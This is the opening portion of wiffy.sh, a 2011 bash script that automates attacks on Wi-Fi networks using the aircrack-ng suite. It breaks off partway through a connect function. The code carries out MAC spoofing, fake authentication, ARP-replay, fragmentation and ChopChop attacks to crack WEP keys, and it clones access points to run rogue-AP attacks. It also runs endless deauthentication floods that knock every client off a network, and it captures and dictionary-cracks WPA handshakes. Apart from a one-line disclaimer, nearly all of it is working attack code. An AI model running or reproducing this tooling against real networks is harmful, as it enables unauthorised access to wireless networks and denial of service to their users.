#!/bin/bash
#----------------------------------------------------------------------------------------------#
#wiffy.sh v0.2 (#0 BETA #6) ~ 2011-03-17                                                      #
# (C)opyright 2011 - g0tmi1k                                                                   #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#                By running this, YOU are using this program at YOUR OWN RISK.                 #
#            This software is provided "as is", WITHOUT ANY guarantees OR warranty.            #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the GNU General Public License for more details.                                        #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Default Settings---------------------------------------------------------------------------#
# [ /crack/dos/inject/karma/decode/table] What do you want to do today?
mode=" "

# [Interface] Which interface to use.
interface="wlan0"

# [random/set/false/client] Changes the MAC address. [MAC] Only used if macMode value is "set".
macMode="random"
fakeMac="00:05:7c:9a:58:3f"

# [/path/to/file] Location of the folder/file(s). # Can't use ~/ with "" around path.
capFolder="$(pwd)/cap/"
decodeFolder="$(pwd)/cap/"
wordlist="/root/Desktop/Wordlists/"

# [wordlist/brute] Use a existing wordlist or generate on-the-fly. [aircrack-ng/cowpatty/pyrit] Which software to use?
wpaMethod="wordlist"
wpaSoftware="aircrack-ng"

# [true/false] Connect to network after cracking key?
connect="false"

# [true/false] Keep captured cap's?
keepCap="true"

# [true/false] Attempt to generate an ETA by testing the system performance.
benchmark="true"

# [Seconds] How long to wait? Longer = higher chance of success. (Note: timeClient=0 or loopWPA=0 = Wiffy will patiently wait for forever!)
timeAP="20"
timeClient="10"
timeWEP="180"
loopWPA="3"

#---Default Variables--------------------------------------------------------------------------#
attackMethod="ap"               # [ap/apless/clone] Attack method
 crackMethod="online"           # [online/offline] Do we need to capture new?
 displayMore="false"            # [true/false] Gives more details on what's happening
 diagnostics="false"            # [true/false] Creates a output file displays exactly what's going on
       quiet="false"            # [true/false] If true, it doesn't use xterm - just uses the one output window
     verbose="0"                # [0/1/2] Shows more info. 0=normal, 1=more, 2=more+commands
       debug="false"            # [true/false] Doesn't delete files, shows more on screen etc.
     logFile="wiffy.log"        # [/path/to/file] Filename of output
         svn="33"               # SVN (Used for self-updating)
     version="0.2 (#0 BETA6)"   # Program version
trap 'interrupt break' 2        # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function action() { #action "title" "command" #screen&file #x|y|lines #hold
   if [ "$debug" == "true" ]; then echo -e "action~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi
   if [ "$3" ] && [ "$3" != "true" ] && [ "$3" != "false" ]; then error="3"; fi
   if [ "$5" ] && [ "$5" != "true" ] && [ "$5" != "false" ]; then error="5"; fi

   if [ "$error" != "free" ]; then
      display error "action Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: action (Error code: $error): $1, $2, $3, $4, $5" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   command="$2"
   if [ "$quiet" == "true" ] || [ ! -e "/usr/bin/xterm" ] || [ ! "$4" ]; then
      if [ "$verbose" == "2" ]; then echo "eval $command"   #Command:
      else command="$command 2> /dev/null"; fi              # Hides output
      if [ "$diagnostics" == "true" ]; then echo -e "$1~$command" >> $logFile; fi
      eval "$command"
   else
      xterm="xterm"   #Defaults
      x="100"; y="0"
      lines="15"
      if [ "$5" == "true" ]; then xterm="$xterm -hold"; fi
      if [ "$verbose" == "2" ]; then echo "$command"; fi   #Command:
      if [ "$diagnostics" == "true" ]; then echo "$1~$command" >> $logFile; fi
      if [ "$diagnostics" == "true" ] && [ "$3" == "true" ]; then command="$command | tee -a $logFile"; fi
      if [ "$4" ]; then
         x=$(echo $4 | cut -d '|' -f1)
         y=$(echo $4 | cut -d '|' -f2)
         lines=$(echo $4 | cut -d '|' -f3)
      fi
      if [ "$debug" == "true" ]; then echo -e "$xterm -geometry 100x$lines+$x+$y -T \"wiffy v$version - $1\" -e \"$command\""; fi
      $xterm -geometry 100x$lines+$x+$y -T "wiffy v$version - $1" -e "$command"
   fi
   return 0
}
function attack() { #attack mode #"$essid" $bssid #$client #$channel
   if [ "$debug" == "true" ]; then echo -e "attack~$@"; fi
   error="free"
   if [ -z "$encryption" ]; then return 3; fi
   if [ -z "$1" ] || [ -z "$3" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "attack Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: attack (Error code: $error): $1, $2, $3, $4" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "FakeAuth" ]; then
      display action "Attack ($1): $4"
      command="aireplay-ng --fakeauth 0 -e \"$2\" -a $3 -h $4 $monitorInterface | tee \"$(pwd)/tmp/wiffy.tmp\""
      if [ "$client" == "$mac" ]; then action "$1" "$command" "true" "0|295|5"
      else action "$1" "$command" "true" "0|195|5"; fi
      if [ -e "$(pwd)/tmp/wiffy.tmp" ]; then
         if grep -q "No such BSSID available" "$(pwd)/tmp/wiffy.tmp"; then display error "Couldn't detect '$1'" 1>&2; stage="done"
         elif grep -q "$monitorInterface is on channel" "$(pwd)/tmp/wiffy.tmp"; then display error "$monitorInterface doesn't support packet injecting [2]" 1>&2;
         elif grep -q "Association successful" "$(pwd)/tmp/wiffy.tmp" && [ "$displayMore" == "true" ]; then display more "Attack ($1): Successfully associate!"; fi
      fi
      return 0
   elif [ "$1" == "ARPReplay" ]; then
      display action "Attack ($1): $4"
      action "$1" "aireplay-ng --arpreplay -e \"$2\" -b $3 -h $4 $monitorInterface" "true" "0|195|5" & sleep 2
      action "$1" "aireplay-ng --deauth 10 -e \"$2\" -a $3 -c $4 $monitorInterface" "true" "0|295|5" # Use function?
      sleep 1
      return 0
   elif [ "$1" == "DeAuth" ]; then
      command="aireplay-ng --deauth 10"
      if [ "$4" ]; then command="$command -e \"$2\" -c $4"
      elif [ "$2" ]; then command="$command -e \"$2\""; fi
      command="$command -a $3 $monitorInterface | tee \"$(pwd)/tmp/wiffy.tmp\""
      if [ "$4" ]; then
         display action "Attack (DeAuth): $4"
         if [ "$attackMethod" != "crack" ]; then  action "$1" "$command" "true" "0|270|5"
         elif [[ "$encryption" == *WPA* ]]; then action "$1" "$command" "true" "0|195|5"
         else action "$1" "$command" "true" "0|285|5"; fi
      else
         display action "Attack (DeAuth): *everyone*"
         command="$command -a $3 $monitorInterface"
         action "$1" "$command" "true" "0|195|5"
      fi
      if grep -q "$monitorInterface is on channel -1" "$(pwd)/tmp/wiffy.tmp"; then display error "$monitorInterface doesn't support packet injecting [2]" 1>&2; fi
      sleep 1
      return 0
   elif [ "$1" == "Fragment" ]; then
      display action "Attack ($1): $4"
      action "$1" "aireplay-ng --fragment -b $3 -h $4 -m 100 -F $monitorInterface | tee \"$(pwd)/tmp/wiffy.tmp\"" "true" "0|195|5" & sleep 1
      action "$1" "aireplay-ng --deauth 10 -e \"$2\" -a $3 -c $4 $monitorInterface" "true" "0|295|5"
      sleep 1; i=0
      while [ "$i" -lt "120" ] && [ "$stage" == "findClient" ]; do
         if [ -e "$(pwd)/tmp/wiffy.tmp" ] && [[ $(grep "Saving keystream in" "$(pwd)/tmp/wiffy.tmp") ]]; then break; fi
         sleep 1; i=$((i+1))
      done
      if [ -e "$(pwd)/tmp/wiffy.tmp" ]; then
         if grep -q "Failure: the access point does not properly discard frames with an" "$(pwd)/tmp/wiffy.tmp"; then display error "Attack ($1): Failed (1)" 1>&2;
         elif grep -q "Failure: got several deauthentication packets from the AP - try running" "$(pwd)/tmp/wiffy.tmp"; then display error "Attack ($1): Failed (2)" 1>&2;
         elif grep -q "$monitorInterface is on channel" "$(pwd)/tmp/wiffy.tmp"; then display error "Attack ($1): Failed (Channel Error)" 1>&2;
         elif grep -q "Saving keystream in" "$(pwd)/tmp/wiffy.tmp"; then
            if [ "$displayMore" == "true" ]; then display more "Attack ($1): Success!"; fi
            action "$1" "packetforge-ng -0 -a $3 -h $4 -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w \"$(pwd)/tmp/wiffy.arp\"" "true" "0|195|5"
            action "$1" "aireplay-ng --interactive -r \"$(pwd)/tmp/wiffy.arp\" -F $monitorInterface" "true" "0|195|5" &
            sleep 1
         fi
      fi
      return 0
   elif [ "$1" == "ChopChop" ]; then
      display action "Attack ($1): $4"
      action "$1" "aireplay-ng --chopchop -b $3 -h $4 -m 100 -F $monitorInterface | tee \"$(pwd)/tmp/wiffy.tmp\"" "true" "0|195|5" & sleep 1
      action "$1" "aireplay-ng --deauth 10 -e \"$2\" -a $3 -c $4 $monitorInterface" "true" "0|295|5"
      sleep 1; i=0
      while [ "$i" -lt "120" ] && [ "$stage" == "findClient" ]; do
         if [ -e "$(pwd)/tmp/wiffy.tmp" ] && [[ $(grep "Saving keystream in" "$(pwd)/tmp/wiffy.tmp" ) ]]; then break; fi
         sleep 1; i=$((i+1))
      done
      if [ -e "$(pwd)/tmp/wiffy.tmp" ]; then
         if grep -q "Failure: the access point does not properly discard frames with an" "$(pwd)/tmp/wiffy.tmp"; then display error "Attack ($1): Failed (1)" 1>&2;
         elif grep -q "Failure: got several deauthentication packets from the AP - try running" "$(pwd)/tmp/wiffy.tmp"; then display error "Attack ($1): Failed (2)" 1>&2;
         elif grep -q "$monitorInterface is on channel" "$(pwd)/tmp/wiffy.tmp"; then display error "Attack ($1): Failed (Channel Error)" 1>&2;
         elif grep -q "Saving keystream in" "$(pwd)/tmp/wiffy.tmp"; then
            if [ "$displayMore" == "true" ]; then display more "Attack (ChopChop): Success!"; fi
            action "$1" "packetforge-ng -0 -a $3 -h $4 -k 192.168.1.100 -l 192.168.1.1 -y fragment-*.xor -w \"$(pwd)/tmp/wiffy.arp\"" "true" "0|195|5"
            action "$1" "aireplay-ng --interactive -r \"$(pwd)/tmp/wiffy.arp\" -F $monitorInterface" "true" "0|195|5" &
            sleep 1
         fi
      fi
      return 0
   elif [ "$1" == "Interactive" ]; then
      display action "Attack ($1): $client"
      action "Interactive" "aireplay-ng --interactive -b $3 -c FF:FF:FF:FF:FF:FF -h $4 -T 1 -p 0841 -F $monitorInterface" "true" "0|195|5" &
      sleep 1
      return 0
   elif [ "$1" == "mac" ]; then
      display action "Attack (Spoofing): $4"
      action "Spoofing MAC" "ifconfig $3 down; macchanger -m $4 $3; ifconfig $3 up"
      sleep 1
      return 0
   elif [ "$1" == "FakeAP" ]; then
      display action "Attack (Cloning AP): $2"
      if [ "$4" == "WEP1" ] || [ "$4" == "WEP" ]; then action "(AP-Less) [WEP] Hirte" "airbase-ng -N -e \"$2\" -a $3 -W 1 -c $5 $monitorInterface" "true" "0|195|13" & sleep 1 #WEP - Hirte/cfrag WEP attack (recommended)                    # -F "$(pwd)/tmp/wiffy"
      elif [ "$4" == "WEP2" ]; then action "(AP-Less) [WEP] Caffe-Latte" "airbase-ng -L -e \"$essid\" -a $bssid -W 1 -c $channel $monitorInterface" "true" "0|195|13" & sleep 1 #WEP - Caffe-Latte WEP attack (use if driver can't send frags) # -F "$(pwd)/tmp/wiffy"
      elif [[ "$4" == *WPA* ]]; then
         command="airbase-ng -e \"$2\" -a $3 -W 1 -c $5" # Use airodump-ng to capture (So it works with FindClient) - rather than -F with airbase-ng
         if [[ "$4" == *WPA2* ]]; then command="$command -Z"
         elif [[ "$4" == *WPA* ]]; then command="$command -z"; fi
         if [[ "$4" == *TKIP* ]]; then command="$command 2"
         elif [[ "$4" == *CCMP* ]]; then command="$command 4"; fi
         command="$command $monitorInterface"
         action "(AP-Less) $4" "$command" "true" "0|195|13" & sleep 1
      fi
      sleep 1
      return 0
   elif [ "$1" == "DoS" ]; then
      if [ "$4" ]; then
         if [ "$5" ]; then xyl="0|$5|5"
         else xyl="0|0|10"; fi
         display action "Attack (DeAuth): $4"
         action "$1" "aireplay-ng --deauth 0 -e \"$2\" -a $3 -c $4 $monitorInterface | tee \"$(pwd)/tmp/wiffy.tmp\"" "true" "$xyl"
      else
         display action "Attack (DeAuth): *everyone*"
         action "$1" "aireplay-ng --deauth 0 -e \"$2\" -a $3 $monitorInterface | tee \"$(pwd)/tmp/wiffy.tmp\"" "true" "0|0|13"
      fi
      if grep -q "$monitorInterface is on channel -1" "$(pwd)/tmp/wiffy.tmp"; then display error "$monitorInterface doesn't support packet injecting [2]" 1>&2; fi
   else display error "Something went wrong )=   [8]" 1>&2; fi
   return 0
}
function attackWEP() { #attackWEP "$essid" $bssid
   if [ "$debug" == "true" ]; then echo -e "attackWEP~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "attackWEP Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: attackWEP (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
   #---Check DB-----------------------------------------------------------------------------------#
   command=$(grep "$2" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
   if [ "$key" ] && [ "$command" ] && [ "$command" -gt "4" ] && [ "$stage" == "findClient" ]; then testKey "$2" "WEP" "$key"; fi # Key detected from DB
   if [ "$stage" == "done" ]; then crackKey "$1" "$2" "WEP"; fi

   #---Attack - ARPReplay-------------------------------------------------------------------------#
   if [ "$stage" == "findClient" ]; then
      if [ "$client" == "clientless" ]; then attack "FakeAuth" "$1" "$2" "$mac"; client="$mac"; sleep 1; fi
      if [ "$stage" == "findClient" ]; then attack "ARPReplay" "$1" "$2" "$client"; fi
      if [ "$client" == "$mac" ] && [ "$stage" == "findClient" ]; then sleep 8; if [ "$stage" == "findClient" ]; then attack "FakeAuth" "$1" "$2" "$client"; fi; fi
      if [ "$stage" == "findClient" ]; then
         for ((i=0; i<$timeWEP; i++)); do
            echo -ne "\r\E[K\e[01;33m[i]\e[00m Waiting $((timeWEP-i)) seconds for the IVs to increase"
            if [ "$stage" == "findClient" ]; then sleep 1; fi
            command=$(grep "$2" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
            if [ "$key" ] && [ "$command" ] && [ "$command" -gt "4" ]; then
               if [ "$stage" == "findClient" ]; then testKey "$2" "WEP" "$key"; fi # Key detected from DB
               if [ "$stage" == "done" ]; then crackKey "$1" "$2" "WEP"; fi
            elif [ "$command" ] && [ "$command" -gt "5000" ]; then
               if [ "$stage" == "findClient" ]; then moveCap "$1" "$2" "WEP"; fi
               if [ "$stage" == "moveCap" ]; then crackKey "$1" "$2" "WEP"; fi
            fi
            if [ "$stage" == "done" ] || [ "$stage" == "interrupt" ]; then break; fi
         done
      fi
   fi

   #---Attack - Framgment-------------------------------------------------------------------------#
   if [ "$stage" == "findClient" ]; then
      echo -ne "\r\E[K\e[01;31m[!]\e[00m Attack (ARPReplay): Failed\n" 1>&2;
      command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
      if [ -n "$command" ]; then action "Killing programs" "kill $command"; fi # Stopping last attack
      if [ "$client" == "$mac" ]; then attack "FakeAuth" "$1" "$2" "$client"; fi
      attack "Fragment" "$1" "$2" "$client" & sleep 2
      if [ "$stage" == "findClient" ]; then
         for ((i=0; i<$timeWEP; i++)); do
            echo -ne "\r\E[K\e[01;33m[i]\e[00m Waiting $((timeWEP-i)) seconds for the IVs to increase"
            if [ "$stage" == "findClient" ]; then sleep 1; fi
            command=$(grep "$2" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
            command=$(grep "$2" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
            if [ "$key" ] && [ "$command" ] && [ "$command" -gt "4" ]; then
               if [ "$stage" == "findClient" ]; then testKey "$2" "WEP" "$key"; fi # Key detected from DB
               if [ "$stage" == "done" ]; then crackKey "$1" "$2" "WEP"; fi
            elif [ "$command" ] && [ "$command" -gt "5000" ]; then
               if [ "$stage" == "findClient" ]; then moveCap "$1" "$2" "WEP"; fi
               if [ "$stage" == "moveCap" ]; then crackKey "$1" "$2" "WEP"; fi
            fi
            if [ "$stage" == "done" ] || [ "$stage" == "interrupt" ]; then break; fi
         done
      fi
   fi

   #---Attack - ChopChop------------------------------------------------------------------#
   if [ "$stage" == "findClient" ]; then
      echo -ne "\r\E[K\e[01;31m[!]\e[00m Attack (Fragment): Failed\n" 1>&2;
      command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
      if [ -n "$command" ]; then action "Killing programs" "kill $command"; fi # Stopping last attack
      if [ "$client" == "$mac" ]; then attack "FakeAuth" "$1" "$2" "$client"; fi
      attack "ChopChop" "$1" "$2" "$client" & sleep 2
      if [ "$stage" == "findClient" ]; then
         for ((i=0; i<$timeWEP; i++)); do
            echo -ne "\r\E[K\e[01;33m[i]\e[00m Waiting $((timeWEP-i)) seconds for the IVs to increase"
            if [ "$stage" == "findClient" ]; then sleep 1; fi
            command=$(grep "$2" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
            if [ "$key" ] && [ "$command" ] && [ "$command" -gt "4" ]; then
               if [ "$stage" == "findClient" ]; then testKey "$2" "WEP" "$key"; fi # Key detected from DB
               if [ "$stage" == "done" ]; then crackKey "$1" "$2" "WEP"; fi
            elif [ "$command" ] && [ "$command" -gt "5000" ]; then
               if [ "$stage" == "findClient" ]; then moveCap "$1" "$2" "WEP"; fi
               if [ "$stage" == "moveCap" ]; then crackKey "$1" "$2" "WEP"; fi
            fi
            if [ "$stage" == "done" ] || [ "$stage" == "interrupt" ]; then break; fi
         done
      fi
   fi

   #---Attack - Interactive-----------------------------------------------------------------------#
   if [ "$stage" == "findClient" ]; then
      echo -ne "\r\E[K\e[01;31m[!]\e[00m Attack (ChopChop): Failed\n" 1>&2
      command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
      if [ -n "$command" ]; then action "Killing programs" "kill $command"; fi # Stopping last attack
      if [ "$client" == "$mac" ]; then attack "FakeAuth" "$1" "$2" "$client"; fi
      attack "Interactive" "$1" "$2" "$client"
      if [ "$stage" == "findClient" ]; then
         for ((i=0; i<$timeWEP; i++)); do
            echo -ne "\r\E[K\e[01;33m[i]\e[00m Waiting $((timeWEP-i)) seconds for the IVs to increase"
            if [ "$stage" == "findClient" ]; then sleep 1; fi
            command=$(grep "$2" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
            if [ "$key" ] && [ "$command" ] && [ "$command" -gt "4" ]; then
               if [ "$stage" == "findClient" ]; then testKey "$2" "WEP" "$key"; fi # Key detected from DB
               if [ "$stage" == "done" ]; then crackKey "$1" "$2" "WEP"; fi
            elif [ "$command" ] && [ "$command" -gt "5000" ]; then
               if [ "$stage" == "findClient" ]; then moveCap "$1" "$2" "WEP"; fi
               if [ "$stage" == "moveCap" ]; then crackKey "$1" "$2" "WEP"; fi
            fi
            if [ "$stage" == "done" ] || [ "$stage" == "interrupt" ]; then break; fi
         done
      fi
   fi

   #---Attack - Clientless------------------------------------------------------------------------#
   if [ "$stage" == "findClient" ]; then echo -ne "\r\E[K\e[01;31m[!]\e[00m Attack (Interactive): Failed\n" 1>&2
      command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
      if [ "$client" != "$mac" ]; then display info "Switching to: Clientless mode"; client="clientless"; if [ -n "$command" ]; then action "Killing programs" "kill $command"; fi; attackWEP "$1" "$2" "$client"; fi # Try again - this time clientless
   fi

   #----------------------------------------------------------------------------------------------#
   if [ "$stage" == "findClient" ]; then display error "Attack (WEP): Failed ($2). Try editing and increase \"timeWEP\"" 1>&2; fi # WEP attack didn't work
   if [ "$stage" == "findClient" ]; then stage="attack"; fi

   if [ "$keepCap" == "true" ]; then moveCap "$1" "$2" "WEP"; fi

   return 0
}
function attackWPA() { #attackWPA "$essid" $bssid
   if [ "$debug" == "true" ]; then echo -e "attackWPA~$@"; fi
   error="free"; l00p="0"; loop="0" # 0 = First time, 1 = Client, 2 = Everyone
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "attackWPA Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: attackWPA (Error code: $error): $1, $2" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#

   echo "g0tmi1k" > "$(pwd)/tmp/wiffy.tmp" # It's okay, it's less than 8;) (WPA/wPA2 key length is a minimum of 8)
   while [ "$stage" == "findClient" ] && [ "$(pgrep airodump-ng)" ]; do
      action "aircrack-ng" "aircrack-ng \"$(pwd)/tmp/wiffy-01.cap\" -w $(pwd)/tmp/wiffy.tmp -e \"$1\" | tee $(pwd)/tmp/wiffy.handshake" "true" "0|195|5"
      command=$(grep "Passphrase not in dictionary" "$(pwd)/tmp/wiffy.handshake"); if [ "$command" ]; then stage="attack"; fi
      if [ "$stage" == "findClient" ]; then sleep 5; fi
      if [ "$loop" != "1" ] && [ "$stage" == "findClient" ]; then
         if [ "$loop" == "0" ]; then display action "Capturing: Handshake"; # sometimes the deauth from client detection does the trick;)
         else findClient "$1" "$2"  "WPA"; fi
         if [ "$stage" == "findClient" ]; then sleep 2; fi
         for targets in "${client[@]}"; do
            if [ "$stage" == "findClient" ]; then attack "DeAuth" "$1" "$2" "$targets"; fi
         done
         loop="1"                             # Helping "kick", for idle client(s)
      elif [ "$stage" == "findClient" ]; then
         if [ "$stage" == "findClient" ]; then attack "DeAuth" "$1" "$2"; fi # Everyone
         l00p=$((l00p+1))                         # Forever if timeClient is set to "0"
         if [ "$l00p" == "$loopWPA" ]; then      # Check how many times we have tired to crack it. timeClient is meant to be seconds, Not loops. Oops...
            display error "Timed out. Couldn't capture any handshakes connecting to '$1'. Try editing and increase \"timeClient\"." 1>&2
            action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng airodump-ng; sleep 1; killall xterm"  # One time too many;)
         fi
         loop="2"                                 # Next time detect clients, and try them ALL (another method, instead of doing just the AP)
      fi
      if [ "$stage" == "findClient" ]; then sleep 3; fi
   done
   if [ "$displayMore" == "true" ] && [ "$stage" == "attack" ]; then display more "Captured: Handshake"; fi
   action "Killing programs" "killall xterm; sleep 1"
   return 0
}
function benchmark() { #benchmark #"wordlist"
   if [ "$debug" == "true" ]; then echo -e "benchmark~$@"; fi
   #----------------------------------------------------------------------------------------------#
   if [ -e "$(pwd)/tmp/wiffy.benchmark" ]; then
      wordsTotal=$(wc -l < "$1")
      if [ "$wordsTotal" ] && [ "$wordsTotal" -lt "1000" ]; then display error "Failed: Benchmark. Not enough words in \"$1\"" 1>&2; return 1; fi
#*** Benchmarking brute ***
#wordsTotal=$((26**8))
#for i in $1-$2; do
#   tmp=$((${#3}**$1))
#   wordsTotal=$(($wordsTotal+$tmp))
#done
      display info " Start Time=$(date)"
      display info "Total Words=$wordsTotal"
      display info "   Wordlist=$1"

      while true; do
         if [ "$wpaSoftware" == "aircrack-ng" ]; then
            wordsDone=$(cat -A "$(pwd)/tmp/wiffy.benchmark" | grep "keys tested" | tail -1 | sed -n 's/.*] //p' | sed -n 's/ keys tested.*//p' | sed 's/[^0-9.]*//g')
            keySecond=$(cat -A "$(pwd)/tmp/wiffy.benchmark" | grep "keys tested" | tail -1 | sed -n 's/.*keys tested (//p' | sed -n 's/k\/s).*//p' | sed 's/[^0-9.]*//g')
         elif [ "$wpaSoftware" == "cowpatty" ]; then
            wordsDone=$(cat -A "$(pwd)/tmp/wiffy.benchmark" | grep "key no. " | tail -1 | sed -n 's/key no. *//p' | sed 's/:*//g')
            keySecond=$(cat -A "$(pwd)/tmp/wiffy.benchmark" | grep "keys tested" | tail -1 | sed -n 's/.*keys tested (//p' | sed -n 's/k\/s).*//p' | sed 's/[^0-9.]*//g')
         fi
         if [ "$wordsDone" ] && [ "$keySecond" ]; then
            wordsRemain=$((wordsTotal-wordsDone))
            per=$(echo "scale=2; $wordsDone*100/$wordsTotal" | bc)
            timeMins=$(awk 'BEGIN {print '$wordsRemain' / ( '$keySecond' * 60 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1); else printf("%d\n",$1)}' | sed 's/[^0-9.]*//g' )
            timeHours=$(awk 'BEGIN {print '$wordsRemain' / ( '$keySecond' * 3600 ) }' | awk -F\. '{if(($2/10^length($2)) >= .5) printf("%d\n",$1+1); else printf("%d\n",$1)}' | sed 's/[^0-9.]*//g' )
            timeETA=$(date --date="$timeMins min" +"%Y-%m-%d %T")
            if [ "$timeHours" -gt "1" ]; then timeETA="$timeETA ($timeHours hours remains)"
            elif [ "$timeHours" -gt "0" ]; then timeETA="$timeETA ($timeHours hour remains)"
            elif [ "$timeHours" == "0" ] && [ "$timeMins" -gt "1" ]; then timeETA="$timeETA ($timeMins minutes remains)"
            else timeETA="$timeETA ($timeMins minute remains)"; fi
            echo -ne "\r\E[K\e[01;33m[i]\e[00m $per% complete. [ETA] $timeETA. [Words] Done: $wordsDone. Remain: $wordsRemain. Speed: $keySecond"
         fi
         if [ -z "$(pgrep $wpaSoftware)" ]; then break; fi
         echo > "$(pwd)/tmp/wiffy.benchmark"
         sleep 5
      done
      echo    # Blank line
   fi
}
function capture() { #capture $bssid $channel $totalNetwork $currentNetwork
   if [ "$debug" == "true" ]; then echo -e "capture~$@"; fi
   stage="capture"; pathCap="$(pwd)/tmp/wiffy-01.cap"; error="free"
   if [ "$2" ] && [ -z $(echo "$2" | grep -E "^[0-9]+$") ]; then error="2"
   elif [ "$3" ] && [ -z $(echo "$3" | grep -E "^[0-9]+$") ]; then error="3"
   elif [ "$4" ] && [ -z $(echo "$4" | grep -E "^[0-9]+$") ]; then error="4"; fi

   if [ "$error" != "free" ]; then
      display error "capture Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: capture (Error code: $error): $1, $2, $3, $4" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   command="rm -rf $(pwd)/tmp/wiffy-01*; killall airodump-ng; airodump-ng" #rm -vf
   if [ "$1" ] && [ "$2" ]; then command="$command --bssid $1 --channel $2"; fi
   command="$command --write $(pwd)/tmp/wiffy $monitorInterface"
   action "airodump-ng" "$command" "true" "0|0|13" &
   if [ "$3" ] && [ "$4" ]; then display action "Starting: Capture ($(($4+1))/$3)"   # Batch SSIDs/Networks
   elif [ "$1" ] && [ "$2" ]; then display action "Starting: Capture"; fi           # Should be BEFORE the command, however it needs to be this way for the countdown
   #else echo -ne "\r\E[K\e[01;32m[>]\e[00m Scanning: Environment"; fi               # Had to remove it due to -V and Command printing on it
   sleep 1
   return 0
}
function cleanUp() { #cleanUp #mode
   if [ "$debug" == "true" ]; then echo -e "cleanUp~$@"; fi
   stage="cleanUp"
   #----------------------------------------------------------------------------------------------#
   if [ "$1" == "nonuser" ]; then exit 3;
   elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
      if [ "$1" == "interrupt" ]; then echo; fi   # Blank line
      action "Killing programs" "killall -9 aircrack-ng cowpatty pyrit airbase-ng airodump-ng"
      if [ "$(pgrep xterm)" ]; then killall -9 xterm; fi   # Cleans up any running xterms
   fi

   if [ "$1" != "remove" ]; then
      display action "Restoring: Environment"
      if [ "$displayMore" == "true" ]; then display more "Restoring: Programs"; fi
      command=$(iwconfig 2>&1 /dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -1)
      if [ "$command" ]; then action "Monitor Mode (Stopping)" "airmon-ng stop $command  2>&1"; fi
      command="service network-manager start 2> /dev/null; NetworkManager 2>&1"
      if [ -e "/etc/init.d/wicd" ]; then command="$command /etc/init.d/wicd start 2>&1"; fi
      action "Starting services" "$command"   # Backtrack & Ubuntu & Fedora
   fi

   if ( [ "$diagnostics" == "false" ] && [ "$debug" == "false" ] ) || [ "$1" == "remove" ]; then
      if [ "$displayMore" == "true" ]; then display more "Removing: Temp files"; fi
      command="$(pwd)/tmp"
      tmp=$(ls replay_*.cap 2> /dev/null)
      if [ "$tmp" ]; then command="$command replay_*.cap"; fi
      tmp=$(ls fragment*.xor 2> /dev/null)
      if [ "$tmp" ]; then command="$command fragment*.xor"; fi
      action "Removing temp files" "rm -rf $command"   #rm -rfv $command
   fi

   if [ -e "/etc/dhcp3/dhcpd.conf.bkup" ]; then action "Persmissions" "mv -f \"/etc/dhcp3/dhcpd.conf.bkup\" \"/etc/dhcp3/dhcpd.conf\""; fi

   if [ "$1" != "remove" ]; then
      if [ "$diagnostics" == "true" ]; then echo -e "End @ $(date)" >> $logFile; fi
      echo -e "\e[01;36m[*]\e[00m Done! =)"
      exit 0
   fi
}
function connect() { #connect "$essid" "$key" #$client
   if [ "$debug" == "true" ]; then echo -e "connect~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "connect Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: connect (Error code: $error): $1, $2, $3" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#

